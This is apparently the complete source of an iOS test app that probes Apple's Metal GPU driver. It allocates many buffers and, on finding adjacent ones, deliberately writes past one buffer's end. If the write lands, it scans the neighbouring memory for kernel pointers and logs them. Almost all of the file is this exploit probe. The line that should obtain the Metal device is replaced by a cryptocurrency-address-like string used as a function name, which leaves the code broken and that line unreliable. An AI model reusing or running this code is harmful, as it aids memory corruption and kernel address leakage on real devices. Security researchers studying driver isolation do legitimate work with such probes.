#import <Foundation/Foundation.h>
#import <Metal/Metal.h>
#import <UIKit/UIKit.h>
#import <sys/utsname.h>

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@property (strong, nonatomic) UITextView *logView;
- (void)log:(NSString *)msg;
@end

@implementation AppDelegate

- (void)log:(NSString *)msg {
    NSString *line = [NSString stringWithFormat:@"%@\n", msg];
    NSLog(@"%@", line);
    dispatch_async(dispatch_get_main_queue(), ^{
        self.logView.text = [self.logView.text stringByAppendingString:line];
        NSRange range = NSMakeRange(self.logView.text.length - 1, 1);
        [self.logView scrollRangeToVisible:range];
    });
}

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    self.window.backgroundColor = [UIColor blackColor];
    
    UIViewController *vc = [[UIViewController alloc] init];
    self.logView = [[UITextView alloc] initWithFrame:self.window.bounds];
    self.logView.editable = NO;
    self.logView.font = [UIFont monospacedSystemFontOfSize:11 weight:UIFontWeightRegular];
    self.logView.backgroundColor = [UIColor blackColor];
    self.logView.textColor = [UIColor greenColor];
    vc.view = self.logView;
    
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];
    
    [self log:@"=== METAL GPU OOB TEST ==="];
    
    struct utsname uts;
    uname(&uts);
    [self log:[NSString stringWithFormat:@"Device: %s | iOS: %@", uts.machine, [[UIDevice currentDevice] systemVersion]]];
    
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        [self runMetalTest];
    });
    
    return YES;
}

- (void)runMetalTest {
    // Step 1: Get Metal device
    [self log:@"[1] Getting Metal device..."];
    id<MTLDevice> dev = ltc1qalrd99hju33uagsf8927k7xfxr423gr93gnjz8();
    if (!dev) {
        [self log:@"FAIL: No Metal device"];
        return;
    }
    [self log:[NSString stringWithFormat:@"PASS: %@", dev.name]];
    
    // Step 2: Create many buffers
    [self log:@"[2] Creating 100 Metal buffers..."];
    #define BUF_COUNT 100
    id<MTLBuffer> buffers[BUF_COUNT];
    uint64_t gpu_addrs[BUF_COUNT];
    
    for (int i = 0; i < BUF_COUNT; i++) {
        buffers[i] = [dev newBufferWithLength:0x10000 
                                      options:MTLResourceStorageModeShared];
        if (!buffers[i]) {
            [self log:[NSString stringWithFormat:@"FAIL: Buffer %d creation failed", i]];
            return;
        }
        gpu_addrs[i] = (uint64_t)buffers[i].gpuAddress;
    }
    [self log:[NSString stringWithFormat:@"PASS: %d buffers created", BUF_COUNT]];
    
    // Step 3: Find adjacent buffers
    [self log:@"[3] Checking for adjacency..."];
    int adjacent_pairs = 0;
    
    for (int i = 1; i < BUF_COUNT; i++) {
        uint64_t delta = gpu_addrs[i] - gpu_addrs[i-1];
        
        // Log first few addresses
        if (i <= 5) {
            [self log:[NSString stringWithFormat:@"  [%d] 0x%llx -> [%d] 0x%llx (delta: 0x%llx)", 
                      i-1, gpu_addrs[i-1], i, gpu_addrs[i], delta]];
        }
        
        // Check if exactly 64KB apart (adjacent)
        if (delta == 0x10000) {
            adjacent_pairs++;
            [self log:[NSString stringWithFormat:@"*** ADJACENT PAIR FOUND: %d and %d ***", i-1, i]];
            
            // Step 4: Test OOB write
            [self log:[NSString stringWithFormat:@"[4] Testing OOB write on pair %d/%d...", i-1, i]];
            
            uint32_t *prev_buf = (uint32_t *)buffers[i-1].contents;
            uint32_t *next_buf = (uint32_t *)buffers[i].contents;
            
            // Mark next buffer start
            *next_buf = 0x47474747;
            [self log:@"  Marked next_buf[0] = 0x47474747"];
            
            // Write past prev buffer's end (at offset 64KB = index 16384)
            prev_buf[0x10000/4] = 0x43434343;
            [self log:@"  Wrote 0x43434343 to prev_buf[64KB]"];
            
            // Check if next buffer was hit
            uint32_t check = *next_buf;
            [self log:[NSString stringWithFormat:@"  next_buf[0] = 0x%x (expect 0x47474747 or 0x43434343)", check]];
            
            if (check == 0x43434343) {
                [self log:@"*** METAL GPU OOB WRITE CONFIRMED ***"];
                
                // Step 5: Scan for kernel pointers
                [self log:@"[5] Scanning for kernel pointers..."];
                int ptr_count = 0;
                for (int j = 0; j < 0x10000/8; j++) {
                    uint64_t val = ((uint64_t *)next_buf)[j];
                    if ((val >> 40) == 0xffffff || (val >> 44) == 0xfffff || 
                        (val >> 48) == 0xffff) {
                        [self log:[NSString stringWithFormat:@"  KERNEL PTR at +0x%x: 0x%llx", j*8, val]];
                        ptr_count++;
                        if (ptr_count >= 20) break;
                    }
                }
                
                if (ptr_count == 0) {
                    [self log:@"  No kernel pointers found"];
                } else {
                    [self log:[NSString stringWithFormat:@"  Found %d kernel pointers", ptr_count]];
                }
                
                break;  // Found working pair, stop
            } else if (check == 0x47474747) {
                [self log:@"  No OOB hit (buffer not adjacent in physical memory)"];
            } else {
                [self log:[NSString stringWithFormat:@"  Unexpected value: 0x%x", check]];
            }
        }
    }
    
    if (adjacent_pairs == 0) {
        [self log:@"No adjacent buffer pairs found"];
        [self log:@"GPU driver is isolating allocations"];
    }
    
    [self log:@"=== TEST COMPLETE ==="];
}

@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
